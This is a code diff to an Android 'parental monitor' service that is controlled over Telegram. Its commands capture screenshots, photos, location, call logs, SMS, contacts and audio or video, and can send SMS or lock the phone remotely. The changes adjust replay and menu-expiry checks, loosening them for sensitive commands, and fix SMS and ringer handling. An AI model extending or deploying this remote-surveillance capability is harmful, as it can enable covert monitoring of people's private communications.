@@ -136,7 +136,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval")
-        private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/ping"
+        private val NO_REPLAY_COMMANDS = setOf("/sms", "/smsconfirm", "/ring", "/record", "/recordvideo", "/lock")
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
@@ -167,7 +167,7 @@ class MonitoringService : Service() {
         }
         startForegroundImmediate()
         try {
-            com.redeye.parentalmonitor.utils.Background.run {
+            com.redeye.parentalmonitor.utils.Background.runCritical {
                 try {
                     if (PreferencesManager.refreshInstance(this)) {
                         refreshCreds()
@@ -1027,7 +1027,7 @@ class MonitoringService : Service() {
         for (update in updates) {
             val seen = synchronized(handledUpdateIds) {
                 val s = !handledUpdateIds.add(update.updateId)
-                while (handledUpdateIds.size > 300) {
+                while (handledUpdateIds.size > 500) {
                     try {
                         val it = handledUpdateIds.iterator()
                         if (it.hasNext()) {
@@ -1136,7 +1136,7 @@ class MonitoringService : Service() {
         val sender = query.from?.id?.toString() ?: return
         val dupCallback = synchronized(handledCallbackIds) {
             val seen = !handledCallbackIds.add(query.id)
-            while (handledCallbackIds.size > 200) {
+            while (handledCallbackIds.size > 500) {
                 try {
                     val it = handledCallbackIds.iterator()
                     if (it.hasNext()) {
@@ -1178,10 +1178,9 @@ class MonitoringService : Service() {
         }
         val originOk = originChat.isNotEmpty() && originChat == chatId
         val pressedAt = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
-        if (pressedAt > 0L) {
+        if (pressedAt > 0L && command in MUTATING_COMMANDS) {
             val menuAge = System.currentTimeMillis() / 1000L - pressedAt
-            val menuMaxAge = if (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) MUTATING_MAX_AGE_SEC else COMMAND_MAX_AGE_SEC
-            if (menuAge > menuMaxAge) {
+            if (menuAge > MUTATING_MAX_AGE_SEC) {
                 sendToTelegram("\u231B Menu expired, here is a fresh one.", mainMenu())
                 return
             }
@@ -2546,7 +2545,7 @@ class MonitoringService : Service() {
                             android.app.PendingIntent.getBroadcast(
                                 this,
                                 baseCode + it * 7919,
-                                android.content.Intent(sentAction),
+                                android.content.Intent(sentAction).putExtra("part", it).putExtra("of", parts.size),
                                 android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                             )
                         )
@@ -2568,9 +2567,8 @@ class MonitoringService : Service() {
                     sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
                 } else if (okCount.get() > 0) {
                     preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
-                    preferencesManager.clearSmsPendingIf(stagedAt)
                     val smsPreview = try { Html.escape(smsText).let { it.take(safeCut(it, 120)) } } catch (_: Exception) { "" }
-                    val smsNotice = if (smsPreview.isEmpty()) "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Pending cleared; verify with the recipient before retrying because a retry may duplicate the delivered parts." else "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts) to $number. Pending cleared; verify with the recipient before retrying because a retry may duplicate the delivered parts. Text preview: $smsPreview"
+                    val smsNotice = if (smsPreview.isEmpty()) "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Pending kept; verify with the recipient before retrying because a retry may duplicate the delivered parts." else "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts) to $number. Pending kept; verify with the recipient before retrying because a retry may duplicate the delivered parts. Text preview: $smsPreview"
                     sendToTelegram(smsNotice)
                 } else {
                             sendToTelegram("\u26A0\uFE0F SMS not confirmed sent. Pending kept, try /smsconfirm again.")
@@ -2982,6 +2980,10 @@ class MonitoringService : Service() {
     }
 
     private fun teardownJobs() {
+        try {
+            if (ringBusy.get()) restoreRingVolumeNow()
+        } catch (_: Exception) {
+        }
         monitoringJob?.cancel()
         cameraJob?.cancel()
         commandJob?.cancel()
@@ -3018,6 +3020,23 @@ class MonitoringService : Service() {
         videoFlushBusy.set(false)
         try {
             cameraService.forceReset()
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun restoreRingVolumeNow() {
+        try {
+            val previous = try { preferencesManager.ringPrevVolume } catch (_: Exception) { -1 }
+            if (previous < 0) return
+            try {
+                val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
+                audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, previous, 0)
+            } catch (_: Exception) {
+            }
+            try {
+                preferencesManager.clearRingStateSync()
+            } catch (_: Exception) {
+            }
         } catch (_: Exception) {
         }
     }
